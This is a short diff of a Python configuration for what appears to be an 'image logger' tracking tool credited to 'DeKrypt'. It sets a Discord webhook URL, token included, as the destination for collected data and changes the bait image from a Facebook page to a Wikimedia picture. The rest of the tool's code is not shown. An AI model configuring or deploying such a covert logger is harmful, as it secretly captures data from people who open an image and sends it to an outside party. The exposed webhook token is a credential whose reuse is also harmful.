@@ -10,7 +10,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1533884142146551898/O5sMXLYCnGPqGACucFqqgnRkYW_yGYLDXwaNND0aV6TH0fnUSrdkTrOxZp78gV9Nj8WZ",
-    "image": "https://www.facebook.com/61578346852984/?locale=vi_VN", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/vi/7/7d/Bliss.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
